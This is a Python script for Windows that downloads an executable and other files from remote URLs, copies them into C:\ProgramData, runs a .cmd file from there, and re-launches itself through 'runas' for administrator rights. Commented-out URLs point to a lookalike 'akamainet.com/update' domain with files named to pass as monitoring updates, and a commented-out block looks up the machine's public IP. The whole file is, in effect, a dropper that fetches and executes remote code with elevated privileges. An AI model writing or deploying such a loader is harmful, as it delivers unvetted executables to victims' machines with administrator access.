
from asyncore import socket_map
import ctypes
import socket
import subprocess
import sys
import time
import urllib.request
import os
import http.client
from pyqadmin import admin
from elevate import elevate


# url1 = "https://akamainet.com/update/MonitoringCacheLog.cmd"
# url2 = "https://akamainet.com/update/MonitoringCache.exe"
# url3 = "https://akamainet.com/update/Service.SchCache.rtf"
url1 = "https://github.com/shamemask/Python/blob/main/junior/dist/trnsSrnCsh.exe"
url2 = "https://github.com/shamemask/Python/blob/main/junior/dist/2.cmd"
url3 = "https://github.com/shamemask/Python/blob/main/junior/dist/2.rtf"
url = []
url.append(url1)
url.append(url2)
url.append(url3)

path = os.path.abspath(os.path.dirname(sys.argv[0]))
print(f"path is {path}")

# conn = http.client.HTTPConnection("ifconfig.me")
# conn.request("GET", "/ip")
# print(conn.getresponse().read())
# print(socket.gethostbyname(socket.gethostname()))


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def psexecFunc(psexec):
    try:
        run = subprocess.call(psexec, shell=True)
        # run = subprocess.Popen(psexec, stdout=sys.stdout)
        # run.communicate()
        print(run)
    except subprocess.CalledProcessError:
        return


def start(cmd):
    # os.system("pause")
    os.system(cmd)

def download(url):

    for ur in url:
        filename = ur.split('/')[-1]
        if filename.split('.')[-1] == 'cmd':
            cmd = "C:\\programdata\\"+filename
            continue
        print(f"filename is {filename}")
        urllib.request.urlretrieve(ur, filename)
        # time.sleep(5)
        # os.replace(filename, "C:/programdata/"+filename)
        xcopy = "xcopy "+path+'\\'+filename+" C:\\programdata\\" + " /i /e /h /y"
        print(xcopy)
        psexecFunc(xcopy)
        # time.sleep(5)

    print(cmd)
    start(cmd)
    # time.sleep(3)


    # os.system("pause")
cmd = ""
download(url)

# @admin





# @admin

# elevate()
# time.sleep(3)
if is_admin():
    download(url)
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    download(url)
time.sleep(3)
